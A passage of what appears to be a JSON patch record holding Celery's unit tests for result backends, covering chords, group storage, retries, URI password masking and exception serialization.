            "    @patch('celery.backends.base.GroupResult')",
            "    @patch('celery.backends.base.maybe_signature')",
            "    def test_chord_part_return_restore_empty(self, maybe_signature,",
            "                                             GroupResult):",
            "        self.b.implements_incr = True",
            "        GroupResult.restore.return_value = None",
            "        self.b.chord_error_from_stack = Mock()",
            "        callback = Mock(name='callback')",
            "        request = Mock(name='request')",
            "        request.group = 'gid'",
            "        maybe_signature.return_value = callback",
            "        self.b.on_chord_part_return(request, states.SUCCESS, 10)",
            "        self.b.chord_error_from_stack.assert_called_with(",
            "            callback, ANY,",
            "        )",
            "",
            "    def test_filter_ready(self):",
            "        self.b.decode_result = Mock()",
            "        self.b.decode_result.side_effect = pass1",
            "        assert len(list(self.b._filter_ready([",
            "            (1, {'status': states.RETRY}),",
            "            (2, {'status': states.FAILURE}),",
            "            (3, {'status': states.SUCCESS}),",
            "        ]))) == 2",
            "",
            "    @contextmanager",
            "    def _chord_part_context(self, b):",
            "",
            "        @self.app.task(shared=False)",
            "        def callback(result):",
            "            pass",
            "",
            "        b.implements_incr = True",
            "        b.client = Mock()",
            "        with patch('celery.backends.base.GroupResult') as GR:",
            "            deps = GR.restore.return_value = Mock(name='DEPS')",
            "            deps.__len__ = Mock()",
            "            deps.__len__.return_value = 10",
            "            b.incr = Mock()",
            "            b.incr.return_value = 10",
            "            b.expire = Mock()",
            "            task = Mock()",
            "            task.request.group = 'grid'",
            "            cb = task.request.chord = callback.s()",
            "            task.request.chord.freeze()",
            "            callback.backend = b",
            "            callback.backend.fail_from_current_stack = Mock()",
            "            yield task, deps, cb",
            "",
            "    def test_chord_part_return_timeout(self):",
            "        with self._chord_part_context(self.b) as (task, deps, _):",
            "            try:",
            "                self.app.conf.result_chord_join_timeout += 1.0",
            "                self.b.on_chord_part_return(task.request, 'SUCCESS', 10)",
            "            finally:",
            "                self.app.conf.result_chord_join_timeout -= 1.0",
            "",
            "            self.b.expire.assert_not_called()",
            "            deps.delete.assert_called_with()",
            "            deps.join_native.assert_called_with(propagate=True, timeout=4.0)",
            "",
            "    def test_chord_part_return_propagate_set(self):",
            "        with self._chord_part_context(self.b) as (task, deps, _):",
            "            self.b.on_chord_part_return(task.request, 'SUCCESS', 10)",
            "            self.b.expire.assert_not_called()",
            "            deps.delete.assert_called_with()",
            "            deps.join_native.assert_called_with(propagate=True, timeout=3.0)",
            "",
            "    def test_chord_part_return_propagate_default(self):",
            "        with self._chord_part_context(self.b) as (task, deps, _):",
            "            self.b.on_chord_part_return(task.request, 'SUCCESS', 10)",
            "            self.b.expire.assert_not_called()",
            "            deps.delete.assert_called_with()",
            "            deps.join_native.assert_called_with(propagate=True, timeout=3.0)",
            "",
            "    def test_chord_part_return_join_raises_internal(self):",
            "        with self._chord_part_context(self.b) as (task, deps, callback):",
            "            deps._failed_join_report = lambda: iter([])",
            "            deps.join_native.side_effect = KeyError('foo')",
            "            self.b.on_chord_part_return(task.request, 'SUCCESS', 10)",
            "            self.b.fail_from_current_stack.assert_called()",
            "            args = self.b.fail_from_current_stack.call_args",
            "            exc = args[1]['exc']",
            "            assert isinstance(exc, ChordError)",
            "            assert 'foo' in str(exc)",
            "",
            "    def test_chord_part_return_join_raises_task(self):",
            "        b = KVBackend(serializer='pickle', app=self.app)",
            "        with self._chord_part_context(b) as (task, deps, callback):",
            "            deps._failed_join_report = lambda: iter([",
            "                self.app.AsyncResult('culprit'),",
            "            ])",
            "            deps.join_native.side_effect = KeyError('foo')",
            "            b.on_chord_part_return(task.request, 'SUCCESS', 10)",
            "            b.fail_from_current_stack.assert_called()",
            "            args = b.fail_from_current_stack.call_args",
            "            exc = args[1]['exc']",
            "            assert isinstance(exc, ChordError)",
            "            assert 'Dependency culprit raised' in str(exc)",
            "",
            "    def test_restore_group_from_json(self):",
            "        b = KVBackend(serializer='json', app=self.app)",
            "        g = self.app.GroupResult(",
            "            'group_id',",
            "            [self.app.AsyncResult('a'), self.app.AsyncResult('b')],",
            "        )",
            "        b._save_group(g.id, g)",
            "        g2 = b._restore_group(g.id)['result']",
            "        assert g2 == g",
            "",
            "    def test_restore_group_from_pickle(self):",
            "        b = KVBackend(serializer='pickle', app=self.app)",
            "        g = self.app.GroupResult(",
            "            'group_id',",
            "            [self.app.AsyncResult('a'), self.app.AsyncResult('b')],",
            "        )",
            "        b._save_group(g.id, g)",
            "        g2 = b._restore_group(g.id)['result']",
            "        assert g2 == g",
            "",
            "    def test_chord_apply_fallback(self):",
            "        self.b.implements_incr = False",
            "        self.b.fallback_chord_unlock = Mock()",
            "        header_result_args = (",
            "            'group_id',",
            "            [self.app.AsyncResult(x) for x in range(3)],",
            "        )",
            "        self.b.apply_chord(",
            "            header_result_args, 'body', foo=1,",
            "        )",
            "        self.b.fallback_chord_unlock.assert_called_with(",
            "            self.app.GroupResult(*header_result_args), 'body', foo=1,",
            "        )",
            "",
            "    def test_get_missing_meta(self):",
            "        assert self.b.get_result('xxx-missing') is None",
            "        assert self.b.get_state('xxx-missing') == states.PENDING",
            "",
            "    def test_save_restore_delete_group(self):",
            "        tid = uuid()",
            "        tsr = self.app.GroupResult(",
            "            tid, [self.app.AsyncResult(uuid()) for _ in range(10)],",
            "        )",
            "        self.b.save_group(tid, tsr)",
            "        self.b.restore_group(tid)",
            "        assert self.b.restore_group(tid) == tsr",
            "        self.b.delete_group(tid)",
            "        assert self.b.restore_group(tid) is None",
            "",
            "    def test_restore_missing_group(self):",
            "        assert self.b.restore_group('xxx-nonexistant') is None",
            "",
            "",
            "class test_KeyValueStoreBackend_interface:",
            "",
            "    def test_get(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app).get('a')",
            "",
            "    def test_set(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app)._set_with_state('a', 1, states.SUCCESS)",
            "",
            "    def test_incr(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app).incr('a')",
            "",
            "    def test_cleanup(self):",
            "        assert not KeyValueStoreBackend(self.app).cleanup()",
            "",
            "    def test_delete(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app).delete('a')",
            "",
            "    def test_mget(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app).mget(['a'])",
            "",
            "    def test_forget(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app).forget('a')",
            "",
            "",
            "class test_DisabledBackend:",
            "",
            "    def test_store_result(self):",
            "        DisabledBackend(self.app).store_result()",
            "",
            "    def test_is_disabled(self):",
            "        with pytest.raises(NotImplementedError):",
            "            DisabledBackend(self.app).get_state('foo')",
            "",
            "    def test_as_uri(self):",
            "        assert DisabledBackend(self.app).as_uri() == 'disabled://'",
            "",
            "    @pytest.mark.celery(result_backend='disabled')",
            "    def test_chord_raises_error(self):",
            "        with pytest.raises(NotImplementedError):",
            "            chord(self.add.s(i, i) for i in range(10))(self.add.s([2]))",
            "",
            "    @pytest.mark.celery(result_backend='disabled')",
            "    def test_chain_with_chord_raises_error(self):",
            "        with pytest.raises(NotImplementedError):",
            "            (self.add.s(2, 2) |",
            "             group(self.add.s(2, 2),",
            "                   self.add.s(5, 6)) | self.add.s()).delay()",
            "",
            "",
            "class test_as_uri:",
            "",
            "    def setup(self):",
            "        self.b = BaseBackend(",
            "            app=self.app,",
            "            url='sch://uuuu:pwpw@hostname.dom'",
            "        )",
            "",
            "    def test_as_uri_include_password(self):",
            "        assert self.b.as_uri(True) == self.b.url",
            "",
            "    def test_as_uri_exclude_password(self):",
            "        assert self.b.as_uri() == 'sch://uuuu:**@hostname.dom/'",
            "",
            "",
            "class test_backend_retries:",
            "",
            "    def test_should_retry_exception(self):",
            "        assert not BaseBackend(app=self.app).exception_safe_to_retry(Exception(\"test\"))",
            "",
            "    def test_get_failed_never_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = False, self.app.conf.result_backend_always_retry",
            "",
            "        expected_exc = Exception(\"failed\")",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.side_effect = [",
            "                expected_exc,",
            "                {'status': states.SUCCESS, 'result': 42}",
            "            ]",
            "            try:",
            "                b.get_task_meta(sentinel.task_id)",
            "                assert False",
            "            except Exception as exc:",
            "                assert b._sleep.call_count == 0",
            "                assert exc == expected_exc",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "",
            "    def test_get_with_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = True, self.app.conf.result_backend_always_retry",
            "",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.side_effect = [",
            "                Exception(\"failed\"),",
            "                {'status': states.SUCCESS, 'result': 42}",
            "            ]",
            "            res = b.get_task_meta(sentinel.task_id)",
            "            assert res == {'status': states.SUCCESS, 'result': 42}",
            "            assert b._sleep.call_count == 1",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "",
            "    def test_get_reaching_max_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = True, self.app.conf.result_backend_always_retry",
            "        self.app.conf.result_backend_max_retries, prev_max_retries = 0, self.app.conf.result_backend_max_retries",
            "",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.side_effect = [",
            "                Exception(\"failed\"),",
            "                {'status': states.SUCCESS, 'result': 42}",
            "            ]",
            "            try:",
            "                b.get_task_meta(sentinel.task_id)",
            "                assert False",
            "            except BackendGetMetaError:",
            "                assert b._sleep.call_count == 0",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "            self.app.conf.result_backend_max_retries = prev_max_retries",
            "",
            "    def test_get_unsafe_exception(self):",
            "        self.app.conf.result_backend_always_retry, prev = True, self.app.conf.result_backend_always_retry",
            "",
            "        expected_exc = Exception(\"failed\")",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.side_effect = [",
            "                expected_exc,",
            "                {'status': states.SUCCESS, 'result': 42}",
            "            ]",
            "            try:",
            "                b.get_task_meta(sentinel.task_id)",
            "                assert False",
            "            except Exception as exc:",
            "                assert b._sleep.call_count == 0",
            "                assert exc == expected_exc",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "",
            "    def test_store_result_never_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = False, self.app.conf.result_backend_always_retry",
            "",
            "        expected_exc = Exception(\"failed\")",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.return_value = {",
            "                'status': states.RETRY,",
            "                'result': {",
            "                    \"exc_type\": \"Exception\",",
            "                    \"exc_message\": [\"failed\"],",
            "                    \"exc_module\": \"builtins\",",
            "                },",
            "            }",
            "            b._store_result = Mock()",
            "            b._store_result.side_effect = [",
            "                expected_exc,",
            "                42",
            "            ]",
            "            try:",
            "                b.store_result(sentinel.task_id, 42, states.SUCCESS)",
            "            except Exception as exc:",
            "                assert b._sleep.call_count == 0",
            "                assert exc == expected_exc",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "",
            "    def test_store_result_with_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = True, self.app.conf.result_backend_always_retry",
            "",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.return_value = {",
            "                'status': states.RETRY,",
            "                'result': {",
            "                    \"exc_type\": \"Exception\",",
            "                    \"exc_message\": [\"failed\"],",
            "                    \"exc_module\": \"builtins\",",
            "                },",
            "            }",
            "            b._store_result = Mock()",
            "            b._store_result.side_effect = [",
            "                Exception(\"failed\"),",
            "                42",
            "            ]",
            "            res = b.store_result(sentinel.task_id, 42, states.SUCCESS)",
            "            assert res == 42",
            "            assert b._sleep.call_count == 1",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "",
            "    def test_store_result_reaching_max_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = True, self.app.conf.result_backend_always_retry",
            "        self.app.conf.result_backend_max_retries, prev_max_retries = 0, self.app.conf.result_backend_max_retries",
            "",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.return_value = {",
            "                'status': states.RETRY,",
            "                'result': {",
            "                    \"exc_type\": \"Exception\",",
            "                    \"exc_message\": [\"failed\"],",
            "                    \"exc_module\": \"builtins\",",
            "                },",
            "            }",
            "            b._store_result = Mock()",
            "            b._store_result.side_effect = [",
            "                Exception(\"failed\"),",
            "                42",
            "            ]",
            "            try:",
            "                b.store_result(sentinel.task_id, 42, states.SUCCESS)",
            "                assert False",
            "            except BackendStoreError:",
            "                assert b._sleep.call_count == 0",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "            self.app.conf.result_backend_max_retries = prev_max_retries"
        ],
        "afterPatchFile": [
            "import re",
            "from contextlib import contextmanager",
            "from unittest.mock import ANY, MagicMock, Mock, call, patch, sentinel",
            "",
            "import pytest",
            "from kombu.serialization import prepare_accept_content",
            "from kombu.utils.encoding import ensure_bytes",
            "",
            "import celery",
            "from celery import chord, group, signature, states, uuid",
            "from celery.app.task import Context, Task",
            "from celery.backends.base import (BaseBackend, DisabledBackend,",
            "                                  KeyValueStoreBackend, _nulldict)",
            "from celery.exceptions import (BackendGetMetaError, BackendStoreError,",
            "                               ChordError, SecurityError, TimeoutError)",
            "from celery.result import result_from_tuple",
            "from celery.utils import serialization",
            "from celery.utils.functional import pass1",
            "from celery.utils.serialization import UnpickleableExceptionWrapper",
            "from celery.utils.serialization import find_pickleable_exception as fnpe",
            "from celery.utils.serialization import get_pickleable_exception as gpe",
            "from celery.utils.serialization import subclass_exception",
            "",
            "",
            "class wrapobject:",
            "",
            "    def __init__(self, *args, **kwargs):",
            "        self.args = args",
            "",
            "",
            "class paramexception(Exception):",
            "",
            "    def __init__(self, param):",
            "        self.param = param",
            "",
            "",
            "class objectexception:",
            "    class Nested(Exception):",
            "        pass",
            "",
            "",
            "Oldstyle = None",
            "",
            "Unpickleable = subclass_exception(",
            "    'Unpickleable', KeyError, 'foo.module',",
            ")",
            "Impossible = subclass_exception(",
            "    'Impossible', object, 'foo.module',",
            ")",
            "Lookalike = subclass_exception(",
            "    'Lookalike', wrapobject, 'foo.module',",
            ")",
            "",
            "",
            "class test_nulldict:",
            "",
            "    def test_nulldict(self):",
            "        x = _nulldict()",
            "        x['foo'] = 1",
            "        x.update(foo=1, bar=2)",
            "        x.setdefault('foo', 3)",
            "",
            "",
            "class test_serialization:",
            "",
            "    def test_create_exception_cls(self):",
            "        assert serialization.create_exception_cls('FooError', 'm')",
            "        assert serialization.create_exception_cls('FooError', 'm', KeyError)",
            "",
            "",
            "class test_Backend_interface:",
            "",
            "    def setup(self):",
            "        self.app.conf.accept_content = ['json']",
            "",
            "    def test_accept_precedence(self):",
            "",
            "        # default is app.conf.accept_content",
            "        accept_content = self.app.conf.accept_content",
            "        b1 = BaseBackend(self.app)",
            "        assert prepare_accept_content(accept_content) == b1.accept",
            "",
            "        # accept parameter",
            "        b2 = BaseBackend(self.app, accept=['yaml'])",
            "        assert len(b2.accept) == 1",
            "        assert list(b2.accept)[0] == 'application/x-yaml'",
            "        assert prepare_accept_content(['yaml']) == b2.accept",
            "",
            "        # accept parameter over result_accept_content",
            "        self.app.conf.result_accept_content = ['json']",
            "        b3 = BaseBackend(self.app, accept=['yaml'])",
            "        assert len(b3.accept) == 1",
            "        assert list(b3.accept)[0] == 'application/x-yaml'",
            "        assert prepare_accept_content(['yaml']) == b3.accept",
            "",
            "        # conf.result_accept_content if specified",
            "        self.app.conf.result_accept_content = ['yaml']",
            "        b4 = BaseBackend(self.app)",
            "        assert len(b4.accept) == 1",
            "        assert list(b4.accept)[0] == 'application/x-yaml'",
            "        assert prepare_accept_content(['yaml']) == b4.accept",
            "",
            "    def test_get_result_meta(self):",
            "        b1 = BaseBackend(self.app)",
            "        meta = b1._get_result_meta(result={'fizz': 'buzz'},",
            "                                   state=states.SUCCESS, traceback=None,",
            "                                   request=None)",
            "        assert meta['status'] == states.SUCCESS",
            "        assert meta['result'] == {'fizz': 'buzz'}",
            "        assert meta['traceback'] is None",
            "",
            "        self.app.conf.result_extended = True",
            "        args = ['a', 'b']",
            "        kwargs = {'foo': 'bar'}",
            "        task_name = 'mytask'",
            "",
            "        b2 = BaseBackend(self.app)",
            "        request = Context(args=args, kwargs=kwargs,",
            "                          task=task_name,",
            "                          delivery_info={'routing_key': 'celery'})",
            "        meta = b2._get_result_meta(result={'fizz': 'buzz'},",
            "                                   state=states.SUCCESS, traceback=None,",
            "                                   request=request, encode=False)",
            "        assert meta['name'] == task_name",
            "        assert meta['args'] == args",
            "        assert meta['kwargs'] == kwargs",
            "        assert meta['queue'] == 'celery'",
            "",
            "    def test_get_result_meta_encoded(self):",
            "        self.app.conf.result_extended = True",
            "        b1 = BaseBackend(self.app)",
            "        args = ['a', 'b']",
            "        kwargs = {'foo': 'bar'}",
            "",
            "        request = Context(args=args, kwargs=kwargs)",
            "        meta = b1._get_result_meta(result={'fizz': 'buzz'},",
            "                                   state=states.SUCCESS, traceback=None,",
            "                                   request=request, encode=True)",
            "        assert meta['args'] == ensure_bytes(b1.encode(args))",
            "        assert meta['kwargs'] == ensure_bytes(b1.encode(kwargs))",
            "",
            "    def test_get_result_meta_with_none(self):",
            "        b1 = BaseBackend(self.app)",
            "        meta = b1._get_result_meta(result=None,",
            "                                   state=states.SUCCESS, traceback=None,",
            "                                   request=None)",
            "        assert meta['status'] == states.SUCCESS",
            "        assert meta['result'] is None",
            "        assert meta['traceback'] is None",
            "",
            "        self.app.conf.result_extended = True",
            "        args = ['a', 'b']",
            "        kwargs = {'foo': 'bar'}",
            "        task_name = 'mytask'",
            "",
            "        b2 = BaseBackend(self.app)",
            "        request = Context(args=args, kwargs=kwargs,",
            "                          task=task_name,",
            "                          delivery_info={'routing_key': 'celery'})",
            "        meta = b2._get_result_meta(result=None,",
            "                                   state=states.SUCCESS, traceback=None,",
            "                                   request=request, encode=False)",
            "        assert meta['name'] == task_name",
            "        assert meta['args'] == args",
            "        assert meta['kwargs'] == kwargs",
            "        assert meta['queue'] == 'celery'",
            "",
            "",
            "class test_BaseBackend_interface:",
            "",
            "    def setup(self):",
            "        self.b = BaseBackend(self.app)",
            "",
            "        @self.app.task(shared=False)",
            "        def callback(result):",
            "            pass",
            "",
            "        self.callback = callback",
            "",
            "    def test__forget(self):",
            "        with pytest.raises(NotImplementedError):",
            "            self.b._forget('SOMExx-N0Nex1stant-IDxx-')",
            "",
            "    def test_forget(self):",
            "        with pytest.raises(NotImplementedError):",
            "            self.b.forget('SOMExx-N0nex1stant-IDxx-')",
            "",
            "    def test_on_chord_part_return(self):",
            "        self.b.on_chord_part_return(None, None, None)",
            "",
            "    def test_apply_chord(self, unlock='celery.chord_unlock'):",
            "        self.app.tasks[unlock] = Mock()",
            "        header_result_args = (",
            "            uuid(),",
            "            [self.app.AsyncResult(x) for x in range(3)],",
            "        )",
            "        self.b.apply_chord(header_result_args, self.callback.s())",
            "        assert self.app.tasks[unlock].apply_async.call_count",
            "",
            "    def test_chord_unlock_queue(self, unlock='celery.chord_unlock'):",
            "        self.app.tasks[unlock] = Mock()",
            "        header_result_args = (",
            "            uuid(),",
            "            [self.app.AsyncResult(x) for x in range(3)],",
            "        )",
            "        body = self.callback.s()",
            "",
            "        self.b.apply_chord(header_result_args, body)",
            "        called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "        assert called_kwargs['queue'] == 'testcelery'",
            "",
            "        routing_queue = Mock()",
            "        routing_queue.name = \"routing_queue\"",
            "        self.app.amqp.router.route = Mock(return_value={",
            "            \"queue\": routing_queue",
            "        })",
            "        self.b.apply_chord(header_result_args, body)",
            "        assert self.app.amqp.router.route.call_args[0][1] == body.name",
            "        called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "        assert called_kwargs[\"queue\"] == \"routing_queue\"",
            "",
            "        self.b.apply_chord(header_result_args, body.set(queue='test_queue'))",
            "        called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "        assert called_kwargs['queue'] == 'test_queue'",
            "",
            "        @self.app.task(shared=False, queue='test_queue_two')",
            "        def callback_queue(result):",
            "            pass",
            "",
            "        self.b.apply_chord(header_result_args, callback_queue.s())",
            "        called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "        assert called_kwargs['queue'] == 'test_queue_two'",
            "",
            "        with self.Celery() as app2:",
            "            @app2.task(name='callback_different_app', shared=False)",
            "            def callback_different_app(result):",
            "                pass",
            "",
            "            callback_different_app_signature = self.app.signature('callback_different_app')",
            "            self.b.apply_chord(header_result_args, callback_different_app_signature)",
            "            called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "            assert called_kwargs['queue'] == 'routing_queue'",
            "",
            "            callback_different_app_signature.set(queue='test_queue_three')",
            "            self.b.apply_chord(header_result_args, callback_different_app_signature)",
            "            called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "            assert called_kwargs['queue'] == 'test_queue_three'",
            "",
            "",
            "class test_exception_pickle:",
            "    def test_BaseException(self):",
            "        assert fnpe(Exception()) is None",
            "",
            "    def test_get_pickleable_exception(self):",
            "        exc = Exception('foo')",
            "        assert gpe(exc) == exc",
            "",
            "    def test_unpickleable(self):",
            "        assert isinstance(fnpe(Unpickleable()), KeyError)",
            "        assert fnpe(Impossible()) is None",
            "",
            "",
            "class test_prepare_exception:",
            "",
            "    def setup(self):",
            "        self.b = BaseBackend(self.app)",
            "",
            "    def test_unpickleable(self):",
            "        self.b.serializer = 'pickle'",
            "        x = self.b.prepare_exception(Unpickleable(1, 2, 'foo'))",
            "        assert isinstance(x, KeyError)",
            "        y = self.b.exception_to_python(x)",
            "        assert isinstance(y, KeyError)",
            "",
            "    def test_json_exception_arguments(self):",
            "        self.b.serializer = 'json'",
            "        x = self.b.prepare_exception(Exception(object))",
            "        assert x == {",
            "            'exc_message': serialization.ensure_serializable(",
            "                (object,), self.b.encode),",
            "            'exc_type': Exception.__name__,",
            "            'exc_module': Exception.__module__}",
            "        y = self.b.exception_to_python(x)",
            "        assert isinstance(y, Exception)",
            "",
            "    def test_json_exception_nested(self):",
            "        self.b.serializer = 'json'",
            "        x = self.b.prepare_exception(objectexception.Nested('msg'))",
            "        assert x == {",
            "            'exc_message': ('msg',),",
            "            'exc_type': 'objectexception.Nested',",
            "            'exc_module': objectexception.Nested.__module__}",
            "        y = self.b.exception_to_python(x)",
            "        assert isinstance(y, objectexception.Nested)",
            "",
            "    def test_impossible(self):",
            "        self.b.serializer = 'pickle'",
            "        x = self.b.prepare_exception(Impossible())",
            "        assert isinstance(x, UnpickleableExceptionWrapper)",
            "        assert str(x)",
            "        y = self.b.exception_to_python(x)",
            "        assert y.__class__.__name__ == 'Impossible'",
            "        assert y.__class__.__module__ == 'foo.module'",
            "",
            "    def test_regular(self):",
            "        self.b.serializer = 'pickle'",
            "        x = self.b.prepare_exception(KeyError('baz'))",
            "        assert isinstance(x, KeyError)",
            "        y = self.b.exception_to_python(x)",
            "        assert isinstance(y, KeyError)",
            "",
            "    def test_unicode_message(self):",
            "        message = '\\u03ac'",
            "        x = self.b.prepare_exception(Exception(message))",
            "        assert x == {'exc_message': (message,),",
            "                     'exc_type': Exception.__name__,",
            "                     'exc_module': Exception.__module__}",
            "",
            "",
            "class KVBackend(KeyValueStoreBackend):",
            "    mget_returns_dict = False",
            "",
            "    def __init__(self, app, *args, **kwargs):",
            "        self.db = {}",
            "        super().__init__(app, *args, **kwargs)",
            "",
            "    def get(self, key):",
            "        return self.db.get(key)",
            "",
            "    def _set_with_state(self, key, value, state):",
            "        self.db[key] = value",
            "",
            "    def mget(self, keys):",
            "        if self.mget_returns_dict:",
            "            return {key: self.get(key) for key in keys}",
            "        else:",
            "            return [self.get(k) for k in keys]",
            "",
            "    def delete(self, key):",
            "        self.db.pop(key, None)",
            "",
            "",
            "class DictBackend(BaseBackend):",
            "",
            "    def __init__(self, *args, **kwargs):",
            "        super().__init__(*args, **kwargs)",
            "        self._data = {'can-delete': {'result': 'foo'}}",
            "",
            "    def _restore_group(self, group_id):",
            "        if group_id == 'exists':",
            "            return {'result': 'group'}",
            "",
            "    def _get_task_meta_for(self, task_id):",
            "        if task_id == 'task-exists':",
            "            return {'result': 'task'}",
            "",
            "    def _delete_group(self, group_id):",
            "        self._data.pop(group_id, None)",
            "",
            "",
            "class test_BaseBackend_dict:",
            "",
            "    def setup(self):",
            "        self.b = DictBackend(app=self.app)",
            "",
            "        @self.app.task(shared=False, bind=True)",
            "        def bound_errback(self, result):",
            "            pass",
            "",
            "        @self.app.task(shared=False)",
            "        def errback(arg1, arg2):",
            "            errback.last_result = arg1 + arg2",
            "",
            "        self.bound_errback = bound_errback",
            "        self.errback = errback",
            "",
            "    def test_delete_group(self):",
            "        self.b.delete_group('can-delete')",
            "        assert 'can-delete' not in self.b._data",
            "",
            "    def test_prepare_exception_json(self):",
            "        x = DictBackend(self.app, serializer='json')",
            "        e = x.prepare_exception(KeyError('foo'))",
            "        assert 'exc_type' in e",
            "        e = x.exception_to_python(e)",
            "        assert e.__class__.__name__ == 'KeyError'",
            "        assert str(e).strip('u') == \"'foo'\"",
            "",
            "    def test_save_group(self):",
            "        b = BaseBackend(self.app)",
            "        b._save_group = Mock()",
            "        b.save_group('foofoo', 'xxx')",
            "        b._save_group.assert_called_with('foofoo', 'xxx')",
            "",
            "    def test_add_to_chord_interface(self):",
            "        b = BaseBackend(self.app)",
            "        with pytest.raises(NotImplementedError):",
            "            b.add_to_chord('group_id', 'sig')",
            "",
            "    def test_forget_interface(self):",
            "        b = BaseBackend(self.app)",
            "        with pytest.raises(NotImplementedError):",
            "            b.forget('foo')",
            "",
            "    def test_restore_group(self):",
            "        assert self.b.restore_group('missing') is None",
            "        assert self.b.restore_group('missing') is None",
            "        assert self.b.restore_group('exists') == 'group'",
            "        assert self.b.restore_group('exists') == 'group'",
            "        assert self.b.restore_group('exists', cache=False) == 'group'",
            "",
            "    def test_reload_group_result(self):",
            "        self.b._cache = {}",
            "        self.b.reload_group_result('exists')",
            "        self.b._cache['exists'] = {'result': 'group'}",
            "",
            "    def test_reload_task_result(self):",
            "        self.b._cache = {}",
            "        self.b.reload_task_result('task-exists')",
            "        self.b._cache['task-exists'] = {'result': 'task'}",
            "",
            "    def test_fail_from_current_stack(self):",
            "        import inspect",
            "        self.b.mark_as_failure = Mock()",
            "        frame_list = []",
            "",
            "        def raise_dummy():",
            "            frame_str_temp = str(inspect.currentframe().__repr__)",
            "            frame_list.append(frame_str_temp)",
            "            raise KeyError('foo')",
            "        try:",
            "            raise_dummy()",
            "        except KeyError as exc:",
            "            self.b.fail_from_current_stack('task_id')",
            "            self.b.mark_as_failure.assert_called()",
            "            args = self.b.mark_as_failure.call_args[0]",
            "            assert args[0] == 'task_id'",
            "            assert args[1] is exc",
            "            assert args[2]",
            "",
            "            tb_ = exc.__traceback__",
            "            while tb_ is not None:",
            "                if str(tb_.tb_frame.__repr__) == frame_list[0]:",
            "                    assert len(tb_.tb_frame.f_locals) == 0",
            "                tb_ = tb_.tb_next",
            "",
            "    def test_prepare_value_serializes_group_result(self):",
            "        self.b.serializer = 'json'",
            "        g = self.app.GroupResult('group_id', [self.app.AsyncResult('foo')])",
            "        v = self.b.prepare_value(g)",
            "        assert isinstance(v, (list, tuple))",
            "        assert result_from_tuple(v, app=self.app) == g",
            "",
            "        v2 = self.b.prepare_value(g[0])",
            "        assert isinstance(v2, (list, tuple))",
            "        assert result_from_tuple(v2, app=self.app) == g[0]",
            "",
            "        self.b.serializer = 'pickle'",
            "        assert isinstance(self.b.prepare_value(g), self.app.GroupResult)",
            "",
            "    def test_is_cached(self):",
            "        b = BaseBackend(app=self.app, max_cached_results=1)",
            "        b._cache['foo'] = 1",
            "        assert b.is_cached('foo')",
            "        assert not b.is_cached('false')",
            "",
            "    def test_mark_as_done__chord(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        b.on_chord_part_return = Mock()",
            "        b.mark_as_done('id', 10, request=request)",
            "        b.on_chord_part_return.assert_called_with(request, states.SUCCESS, 10)",
            "",
            "    def test_mark_as_failure__bound_errback_eager(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        request.delivery_info = {",
            "            'is_eager': True",
            "        }",
            "        request.errbacks = [",
            "            self.bound_errback.subtask(args=[1], immutable=True)]",
            "        exc = KeyError()",
            "        group = self.patching('celery.backends.base.group')",
            "        b.mark_as_failure('id', exc, request=request)",
            "        group.assert_called_with(request.errbacks, app=self.app)",
            "        group.return_value.apply.assert_called_with(",
            "            (request.id, ), parent_id=request.id, root_id=request.root_id)",
            "",
            "    def test_mark_as_failure__bound_errback(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
